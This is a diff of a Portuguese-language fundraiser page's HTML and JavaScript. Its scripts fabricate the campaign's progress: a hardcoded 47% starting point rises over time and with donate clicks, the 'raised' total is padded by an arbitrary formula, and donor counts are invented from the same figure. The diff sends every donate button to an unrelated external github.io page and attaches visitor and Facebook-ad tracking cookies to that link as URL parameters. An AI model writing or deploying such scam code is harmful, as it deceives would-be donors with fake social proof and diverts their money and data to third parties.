@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-PT">
   <head>
 
@@ -11807,6 +11807,7 @@
 
 
 
+<!-- ========== PAGE 1  (first domain)  ========== -->
 <div class="progress-meter_progressMeter__BYOlt progress-meter progress-meter_goalBarVariantProgressMeter___rdnj" style="display: flex; align-items: center; justify-content: space-between; gap: 20px; padding: 10px; border: 1px solid #e6f2ec; border-radius: 8px;">
   <div style="flex: 1;">
     <div class="progress-meter_progressMeterHeading__A6Slt hrt-text-body-sm" style="font-weight: bold; font-size: 16px; margin-bottom: 5px;">
@@ -11857,9 +11858,7 @@
 </div>
 
 <script>
-/**
- * Returns the value of a cookie by name, or null if not found.
- */
+/* ---------------- helper: cookie utils ---------------- */
 function getCookieValue(name) {
   var cookieString = document.cookie || '';
   var cookies = cookieString.split(';');
@@ -11872,51 +11871,65 @@ function getCookieValue(name) {
   return null;
 }
 
-/**
- * Sets/updates the 'myDonationCookie' with the given JS object,
- * stored as a JSON string.
- */
 function setMyDonationCookie(obj) {
-  // 1‑year expiration for example
   var jsonStr = JSON.stringify(obj);
   document.cookie = "myDonationCookie=" + jsonStr + "; path=/; max-age=31536000";
 }
+</script>
 
-/**
- * Calculate the special extra amount to add based on the final displayed percentage.
- * 
- * Pattern from your examples:
- * - If percentage >= 10 (two digits): Add (percentage + 7 + firstDigit*100)
- *   e.g. 47 => 47 + 7 + (4*100) = 454
- *        53 => 53 + 7 + (5*100) = 560
- * - If percentage < 10 (single digit): Add (percentage + 0 + (percentage*100))
- *   e.g. 7 => 7 + 0 + 700 = 707
- */
+<script>
+/* ---------------- percentage helpers ---------------- */
 function getExtraAmount(percentage) {
   if (percentage < 10) {
-    // single digit
     return percentage + (percentage * 100);
   } else {
-    // two digits
     var str = percentage.toString();
     var firstDigit = parseInt(str[0], 10);
     return percentage + 7 + (firstDigit * 100);
   }
 }
+</script>
 
+<script>
+/* ---------------- visit / fbclid cookie ---------------- */
+document.addEventListener("DOMContentLoaded", function () {
+  var visitCookieName = "visitorInfo";
+  var oneYear = 31536000;
+  var urlParams = new URLSearchParams(window.location.search);
+  var hasFbclidInUrl = urlParams.has("fbclid") && urlParams.get("fbclid") !== "";
+
+  var existing = getCookieValue(visitCookieName);
+  var visitObj = {};
+  if (existing) {
+    try { visitObj = JSON.parse(existing); } catch (e) { visitObj = {}; }
+  }
+
+  visitObj.visited = "yes";
+
+  if (hasFbclidInUrl) {
+    visitObj.fbclid = "yes";
+  } else {
+    if (visitObj.fbclid !== "yes") {
+      visitObj.fbclid = "no";
+    }
+  }
+
+  document.cookie = visitCookieName + "=" + JSON.stringify(visitObj) + "; path=/; max-age=" + oneYear;
+});
+</script>
+
+<script>
+/* ---------------- progress bar logic ---------------- */
 document.addEventListener("DOMContentLoaded", function() {
   var totalGoal = 100000;
   var totalDonorsAt100 = 2930;
-  
-  // Base "hardcoded" donation percentage
+
   var donationPercentage = 47;
-  
+
   try {
     var cookieValue = getCookieValue('myDonationCookie');
     if (cookieValue) {
       var cookieObj = JSON.parse(cookieValue);
-      
-      // If we have a 'start' timestamp, calculate how many 6‑hour increments have passed
       if (cookieObj.start) {
         var now = Date.now();
         var startTime = parseInt(cookieObj.start, 10);
@@ -11927,8 +11940,6 @@ document.addEventListener("DOMContentLoaded", function() {
           donationPercentage += increments;
         }
       }
-      
-      // If we have incrementsUsed, add that to the donationPercentage as well
       if (typeof cookieObj.incrementsUsed === 'number') {
         donationPercentage += cookieObj.incrementsUsed;
       }
@@ -11937,35 +11948,25 @@ document.addEventListener("DOMContentLoaded", function() {
     console.log("Cookie parse error or no valid JSON in 'myDonationCookie':", err);
   }
 
-  // Make sure the final donationPercentage never exceeds 100%
   var displayDonationPercentage = Math.min(donationPercentage, 100);
-
-  // Calculate the current raised amount based on the final percentage
   var currentRaised = Math.round((totalGoal * displayDonationPercentage) / 100);
-
-  // Calculate the current donor count
   var currentDonors = Math.round((totalDonorsAt100 * displayDonationPercentage) / 100);
 
-  // Now add the special extra amount (does NOT affect the donor count or actual percentage)
-  // Just for the displayed "raised" value:
   var extraAmount = getExtraAmount(displayDonationPercentage);
   var finalDisplayedRaised = currentRaised + extraAmount;
 
-  // Update DOM elements
   document.getElementById("amountRaisedSpan").textContent = "$" + finalDisplayedRaised.toLocaleString();
   document.getElementById("goalSpan").textContent = "$" + totalGoal.toLocaleString() + " goal";
   document.getElementById("donationsSpan").textContent = currentDonors.toLocaleString() + " donations";
   document.getElementById("progressText").textContent = displayDonationPercentage + "%";
   document.getElementById("progress-title").textContent = displayDonationPercentage + "% of the goal raised";
 
-  // Update the progress circle
   var radius = 36;
   var circumference = 2 * Math.PI * radius;
   var progressCircle = document.getElementById("fundraiser-circle-goal-bar_line");
   var offset = circumference * (1 - (displayDonationPercentage / 100));
   progressCircle.setAttribute("stroke-dashoffset", offset.toString());
 
-  // If the final (calculated) percentage is >= 100, hide donate button & show complete message
   if (displayDonationPercentage >= 100) {
     var donateButtonContainers = document.querySelectorAll('[data-element-id="btn_donate"]');
     donateButtonContainers.forEach(function(container) {
@@ -11979,34 +11980,35 @@ document.addEventListener("DOMContentLoaded", function() {
 });
 </script>
 
-<!-- ------------- SIMPLIFIED DONATION LINK SCRIPT ------------- -->
+<!-- ------------- SIMPLIFIED DONATION LINK SCRIPT (now also ships cookies) ------------- -->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
   var donateAnchors = document.querySelectorAll('[data-element-id="btn_donate"] a');
-  
-  // Single donation link for all locations
-  var defaultLink = 'https://chatbotsai.co/paymentrack';
-  
-  // Preserve any fbclid if present
+
+  var defaultLink = 'https://automast.github.io/proautomast/';
+
   var urlParams = new URLSearchParams(window.location.search);
   var fbclid = urlParams.get('fbclid');
-  var finalLink = defaultLink;
+  var baseLink = defaultLink;
   if (fbclid) {
-    finalLink += (defaultLink.indexOf('?') === -1 ? '?' : '&') + 'fbclid=' + fbclid;
+    baseLink += (baseLink.indexOf('?') === -1 ? '?' : '&') + 'fbclid=' + fbclid;
   }
-  
-  // Assign the link to all donate anchors
+
   donateAnchors.forEach(function(anchor) {
-    anchor.href = finalLink;
+    anchor.href = baseLink;
   });
-  console.log("[GeoScript] Donation links set to:", finalLink);
-  
-  // ---- Increment 'incrementsUsed' in the cookie when donate is clicked ----
+
+  /* When the button is pressed we:
+     1) bump incrementsUsed,
+     2) rebuild the cookie,
+     3) push both cookies into the URL as utm_* params,
+     4) send the user on their way. */
   donateAnchors.forEach(function(anchor) {
     anchor.addEventListener('click', function(e) {
-      e.preventDefault(); // prevent immediate navigation
+      e.preventDefault();
 
       try {
+        /* --- bump the counter in myDonationCookie --- */
         var cookieValue = getCookieValue('myDonationCookie');
         var cookieObj = cookieValue ? JSON.parse(cookieValue) : {};
 
@@ -12015,20 +12017,30 @@ document.addEventListener("DOMContentLoaded", function() {
         } else {
           cookieObj.incrementsUsed = 1;
         }
+        setMyDonationCookie(cookieObj);   // save it
 
-        // Store it back
-        setMyDonationCookie(cookieObj);
+        /* --- collect both cookies so we can ship them --- */
+        var mdcStr = JSON.stringify(cookieObj);
+        var viStr  = getCookieValue('visitorInfo') || '{}';
+
+        /* --- build a fresh URL that carries the data --- */
+        var u = new URL(anchor.href);
+        u.searchParams.set('utm_mdc', encodeURIComponent(mdcStr));
+        u.searchParams.set('utm_vi',  encodeURIComponent(viStr));
+
+        /* --- go to the next page --- */
+        window.location.href = u.toString();
 
       } catch (err) {
-        console.log("[GeoScript] Error updating incrementsUsed:", err);
+        console.log("[GeoScript] trouble preparing redirect:", err);
+        window.location.href = anchor.href; // fallback
       }
-
-      // Now continue to the actual link
-      window.location.href = anchor.href;
     });
   });
 });
 </script>
+
+
 
 
 
